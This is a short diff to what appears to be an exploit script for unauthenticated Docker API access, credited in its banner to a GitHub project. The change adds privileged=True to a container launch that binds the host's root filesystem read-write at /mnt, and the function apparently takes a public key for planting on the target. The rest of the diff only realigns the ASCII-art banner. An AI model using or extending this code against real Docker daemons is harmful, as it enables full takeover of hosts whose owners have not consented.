@@ -38,6 +38,7 @@ def exp(pub_key, url, image):
             image,
             command,
             remove=True,
+            privileged=True,
             volumes={'/': {'bind': '/mnt', 'mode': 'rw'}}
         )
         print(f'{Fore.GREEN}Operation completed successfully.{Style.RESET_ALL}')
@@ -57,8 +58,8 @@ if __name__ == '__main__':
 | |_| | (_) | (__|   <  __/ |     / ___ \|  __/| |   | |_| | | | | (_| | |_| | |_| | | |
 |____/ \___/ \___|_|\_\___|_|    /_/   \_\_|  |___|   \___/|_| |_|\__,_|\__,_|\__|_| |_|
 
-                                                                            By Catherines77
-                                                                            https://github.com/Catherines77/docker_api_unauth
+                                                             By Catherines77
+                                                             https://github.com/Catherines77/docker_api_unauth
     \n""")
 
     if len(sys.argv) != 5 or sys.argv[1] != '-u' or sys.argv[3] != '-k':
